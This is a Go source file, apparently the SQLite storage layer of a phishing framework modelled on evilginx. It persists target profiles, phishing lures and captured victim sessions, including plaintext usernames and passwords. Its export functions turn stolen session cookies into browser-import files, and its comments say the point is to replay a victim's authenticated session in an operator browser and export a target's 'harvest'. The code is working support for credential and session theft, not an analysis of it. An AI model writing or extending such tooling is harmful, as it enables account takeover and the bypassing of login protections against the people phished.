package storage

import (
	"database/sql"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/user/evilpikin/pkg/lures"
	_ "modernc.org/sqlite"
)

type Store struct {
	db *sql.DB
}

func OpenSQLite(path string) (*Store, error) {
	db, err := sql.Open("sqlite", "file:"+path+"?_pragma=busy_timeout(5000)&_pragma=journal_mode(WAL)")
	if err != nil {
		return nil, err
	}
	if err := ApplySchema(db); err != nil {
		return nil, err
	}
	return &Store{db: db}, nil
}

func (s *Store) Close() error {
	return s.db.Close()
}

func (s *Store) UpsertTarget(t *TargetProfile) error {
	t.UpdatedAt = time.Now()
	if t.CreatedAt.IsZero() {
		t.CreatedAt = t.UpdatedAt
	}
	b, err := json.Marshal(t)
	if err != nil {
		return err
	}
	_, err = s.db.Exec(
		`INSERT INTO target_profiles(id, name, enabled, version, data, created_at, updated_at)
		 VALUES(?,?,?,?,?,?,?)
		 ON CONFLICT(id) DO UPDATE SET name=excluded.name, enabled=excluded.enabled, version=excluded.version, data=excluded.data, updated_at=excluded.updated_at`,
		t.ID, t.Name, boolToInt(t.Enabled), t.Version, string(b), t.CreatedAt.Unix(), t.UpdatedAt.Unix(),
	)
	return err
}

func (s *Store) GetTarget(id string) (*TargetProfile, error) {
	row := s.db.QueryRow(`SELECT data FROM target_profiles WHERE id = ?`, id)
	var data string
	if err := row.Scan(&data); err != nil {
		return nil, err
	}
	var t TargetProfile
	if err := json.Unmarshal([]byte(data), &t); err != nil {
		return nil, err
	}
	t.Normalize()
	return &t, nil
}

func (s *Store) ListTargets() ([]*TargetProfile, error) {
	rows, err := s.db.Query(`SELECT data FROM target_profiles ORDER BY name`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	out := []*TargetProfile{}
	for rows.Next() {
		var data string
		if err := rows.Scan(&data); err != nil {
			return nil, err
		}
		var t TargetProfile
		if err := json.Unmarshal([]byte(data), &t); err != nil {
			return nil, err
		}
		t.Normalize()
		out = append(out, &t)
	}
	return out, nil
}

func (s *Store) SetTargetEnabled(id string, enabled bool) error {
	t, err := s.GetTarget(id)
	if err != nil {
		return err
	}
	t.Enabled = enabled
	return s.UpsertTarget(t)
}

func (s *Store) SaveSession(c *CapturedSession) error {
	c.UpdatedAt = time.Now()
	if c.CreatedAt.IsZero() {
		c.CreatedAt = c.UpdatedAt
	}
	b, err := json.Marshal(c)
	if err != nil {
		return err
	}
	_, err = s.db.Exec(
		`INSERT INTO captured_sessions(id, target_id, target_name, username, password, remote_addr, user_agent, status, is_valid, data, created_at, updated_at)
		 VALUES(?,?,?,?,?,?,?,?,?,?,?,?)
		 ON CONFLICT(id) DO UPDATE SET username=excluded.username, password=excluded.password, status=excluded.status, is_valid=excluded.is_valid, data=excluded.data, updated_at=excluded.updated_at`,
		c.ID, c.TargetID, c.TargetName, c.Username, c.Password, c.RemoteAddr, c.UserAgent, c.Status, boolToInt(c.IsValid), string(b), c.CreatedAt.Unix(), c.UpdatedAt.Unix(),
	)
	return err
}

func (s *Store) GetSession(id string) (*CapturedSession, error) {
	row := s.db.QueryRow(`SELECT data FROM captured_sessions WHERE id = ?`, id)
	var data string
	if err := row.Scan(&data); err != nil {
		return nil, err
	}
	var c CapturedSession
	if err := json.Unmarshal([]byte(data), &c); err != nil {
		return nil, err
	}
	return &c, nil
}

// GetSessionByID is an explicit alias for GetSession used by the telemetry /
// dashboard layer (matches the spec's SaveSession/GetSessionByID pairing).
func (s *Store) GetSessionByID(id string) (*CapturedSession, error) {
	return s.GetSession(id)
}

// ExportCookiesNetscape returns the captured session cookies formatted as a
// Netscape cookie-jar file ready for browser/cookie-tool import.
func (s *Store) ExportCookiesNetscape(id string) (string, error) {
	c, err := s.GetSession(id)
	if err != nil {
		return "", err
	}
	return strings.Join(c.NetscapeCookieLines(), "\n"), nil
}

// ExportCookiesJSON returns every captured cookie for a session in the
// evilginx-compatible Cookie-Editor / EditThisCookie browser-import format so
// the authenticated session can be replayed seamlessly in an operator browser.
func (s *Store) ExportCookiesJSON(id string) ([]byte, error) {
	c, err := s.GetSession(id)
	if err != nil {
		return nil, err
	}
	return c.CookiesJSON()
}

// ExportTargetCookiesJSON returns the union of every cookie captured across all
// sessions of a single target, in Cookie-Editor import format. This is the
// multi-tenant "export this target's harvest" primitive: one JSON file per
// target dashboard.
func (s *Store) ExportTargetCookiesJSON(targetID string) ([]byte, error) {
	sessions, err := s.ListSessions(targetID, "")
	if err != nil {
		return nil, err
	}
	entries := []CookieEditorEntry{}
	for _, sess := range sessions {
		all := []CapturedCookie{}
		for _, cs := range sess.Cookies {
			all = append(all, cs...)
		}
		entries = append(entries, sess.cookieEditorEntries(all)...)
	}
	return json.MarshalIndent(entries, "", "  ")
}

func (s *Store) ListSessions(targetID, status string) ([]*CapturedSession, error) {
	var rows *sql.Rows
	var err error
	switch {
	case targetID != "" && status != "":
		rows, err = s.db.Query(`SELECT data FROM captured_sessions WHERE target_id = ? AND status = ? ORDER BY created_at DESC`, targetID, status)
	case targetID != "":
		rows, err = s.db.Query(`SELECT data FROM captured_sessions WHERE target_id = ? ORDER BY created_at DESC`, targetID)
	case status != "":
		rows, err = s.db.Query(`SELECT data FROM captured_sessions WHERE status = ? ORDER BY created_at DESC`, status)
	default:
		rows, err = s.db.Query(`SELECT data FROM captured_sessions ORDER BY created_at DESC`)
	}
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	out := []*CapturedSession{}
	for rows.Next() {
		var data string
		if err := rows.Scan(&data); err != nil {
			return nil, err
		}
		var c CapturedSession
		if err := json.Unmarshal([]byte(data), &c); err != nil {
			return nil, err
		}
		out = append(out, &c)
	}
	return out, nil
}

func (s *Store) DeleteSession(id string) error {
	_, err := s.db.Exec(`DELETE FROM captured_sessions WHERE id = ?`, id)
	return err
}

func (s *Store) DeleteTarget(id string) error {
	_, err := s.db.Exec(`DELETE FROM target_profiles WHERE id = ?`, id)
	return err
}

// --- Lures (tracking-matrix entry points) -----------------------------------

func (s *Store) SaveLure(l *lures.Lure) error {
	b, err := json.Marshal(l)
	if err != nil {
		return err
	}
	_, err = s.db.Exec(
		`INSERT INTO lures(id, path, target_profile, redirect_url, landing_path, is_active, data, created_at)
		 VALUES(?,?,?,?,?,?,?,?)
		 ON CONFLICT(id) DO UPDATE SET path=excluded.path, target_profile=excluded.target_profile, redirect_url=excluded.redirect_url, landing_path=excluded.landing_path, is_active=excluded.is_active, data=excluded.data`,
		l.ID, l.Path, l.TargetProfile, l.RedirectURL, l.LandingPath, boolToInt(l.IsActive), string(b), l.CreatedAt.Unix(),
	)
	return err
}

func (s *Store) GetLure(id string) (*lures.Lure, error) {
	row := s.db.QueryRow(`SELECT data FROM lures WHERE id = ?`, id)
	var data string
	if err := row.Scan(&data); err != nil {
		return nil, err
	}
	var l lures.Lure
	if err := json.Unmarshal([]byte(data), &l); err != nil {
		return nil, err
	}
	return &l, nil
}

func (s *Store) ListLures() ([]*lures.Lure, error) {
	rows, err := s.db.Query(`SELECT data FROM lures ORDER BY created_at DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	out := []*lures.Lure{}
	for rows.Next() {
		var data string
		if err := rows.Scan(&data); err != nil {
			return nil, err
		}
		var l lures.Lure
		if err := json.Unmarshal([]byte(data), &l); err != nil {
			return nil, err
		}
		out = append(out, &l)
	}
	return out, nil
}

func (s *Store) DeleteLure(id string) error {
	_, err := s.db.Exec(`DELETE FROM lures WHERE id = ?`, id)
	return err
}

func (s *Store) SetLureActive(id string, active bool) error {
	_, err := s.db.Exec(`UPDATE lures SET is_active = ? WHERE id = ?`, boolToInt(active), id)
	return err
}

func LoadTargetsFromDir(store *Store, dir string) error {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return err
	}
	for _, e := range entries {
		if e.IsDir() || filepath.Ext(e.Name()) != ".json" {
			continue
		}
		data, err := os.ReadFile(filepath.Join(dir, e.Name()))
		if err != nil {
			return err
		}
		var t TargetProfile
		if err := json.Unmarshal(data, &t); err != nil {
			return err
		}
		t.Normalize()
		if t.ID == "" {
			t.ID = strings.TrimSuffix(e.Name(), ".json")
		}
		if err := store.UpsertTarget(&t); err != nil {
			return err
		}
	}
	return nil
}

func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}

var ErrNotFound = errors.New("storage: record not found")
